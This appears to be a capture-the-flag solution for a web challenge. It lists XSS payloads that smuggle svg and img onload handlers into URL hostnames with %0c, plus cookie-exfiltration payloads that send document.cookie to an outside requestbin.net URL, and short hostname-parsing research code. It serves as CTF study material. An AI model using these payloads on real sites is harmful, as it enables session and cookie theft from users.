
------- POC XSS payload -------

# submit this url and an alert will pop proving XSS
http://<svg%0Conload=alert(42)>/wow

# alternative POC, main trick is to use %0c instead of %20 (space)
http://<img%0Csrc=x%0conerror=alert(42)>/wow

# if you submit this url, an alert would pop inside the admin's browser
https://wsc-2022-web-5-bvel4oasra-uc.a.run.app/visit?url=http%3A%2F%2F%3Cimg%250Csrc%3Dx%250conerror%3Dalert%2842%29%3E%2Fwow

# these elements work too with onload: iframe, body

------- Real Solve 1 -------

# using expression to steal special characters that would otherwise not parse as a "domain"
window.location.protocol.at(4) --> :
''.italics().at(4) --> /
window.location.protocol --> https://

# using this requestbin url
https://requestbin.net/r/jgog6ck1

# submit this URL locally and it'll try to exfiltrate any local cookies
http://<svg%0conload=fetch(window.location.protocol+''.italics().at(4)+''.italics().at(4)+"requestbin.net"+''.italics().at(4)+"r"+''.italics().at(4)+"jgog6ck1"+''.italics().at(4)+document.cookie)>/wow

# if you submit this url, the exfiltration will happen inside the admin's browser
https://wsc-2022-web-5-bvel4oasra-uc.a.run.app/visit?url=http%3A%2F%2F%3Csvg%250conload%3Dfetch%28window.location.protocol%2B%27%27.italics%28%29.at%284%29%2B%27%27.italics%28%29.at%284%29%2B%22requestbin.net%22%2B%27%27.italics%28%29.at%284%29%2B%22r%22%2B%27%27.italics%28%29.at%284%29%2B%22jgog6ck1%22%2B%27%27.italics%28%29.at%284%29%2Bdocument.cookie%29%3E%2Fwow


------ Real Solve 2 -------


# More elegant way using character entity names (the browser expands these inside attr values)
&colon; --> :
&sol; --> /

# using this requestbin url
https://requestbin.net/r/jgog6ck1


# submit this url locally and it'll try to exfiltrate any local cookies
http://<svg%0conload=fetch("https&colon;&sol;&sol;requestbin.net&sol;r&sol;jgog6ck1&sol;"+document.cookie)>/wow

# if you submit this url, the exfiltration will happen inside the admin's browser
https://wsc-2022-web-5-bvel4oasra-uc.a.run.app/visit?url=http%3A%2F%2F%3Csvg%250conload%3Dfetch%28%22https%26colon%3B%26sol%3B%26sol%3Brequestbin.net%26sol%3Br%26sol%3Bjgog6ck1%26sol%3B%22%2Bdocument.cookie%29%3E%2Fwow

and you should see the flag in requestbin.net

------- Some research code -------

If you allow popups, this program shows that only %0c achieves XSS.

for (i = 0; i < 32; i++) {h = '0'+i.toString(16); h = h.substring(h.length-2);url=`http://localhost/visit?url=http://%3csvg%${h}onload=alert(42)%3E/wow`;window.open(url,'_blank')}

A program like this could be used to figure out which characters are legal to use in a hostname:

for (i = 0; i < 1000; i++) {
    let hostname = 'a' + String.fromCharCode(i) + 'b'
    let url = 'http://' + hostname
    try {
        let parsedURL = new URL(url)
        if (parsedURL.hostname === hostname) {
            console.log(i, hostname.charAt(1))
        }
    }
    catch(e) {

    }
}


1
2
3
4
5
6
7
8
11

12

14
15
16
17
18
19
20
21
22
23
24
25
26
27
   28
29
30
31
33 !
34 "
36 $
38 &
39 '
40 (
41 )
42 *
43 +
44 ,
45 -
46 .
48 0
49 1
50 2
51 3
52 4
53 5
54 6
55 7
56 8
57 9
59 ;
60 <
61 =
62 >
94 ^
95 _
96 `
97 a
98 b
99 c
100 d
101 e
102 f
103 g
104 h
105 i
106 j
107 k
108 l
109 m
110 n
111 o
112 p
113 q
114 r
115 s
116 t
117 u
118 v
119 w
120 x
121 y
122 z
123 {
124 |
125 }
126 ~
127 
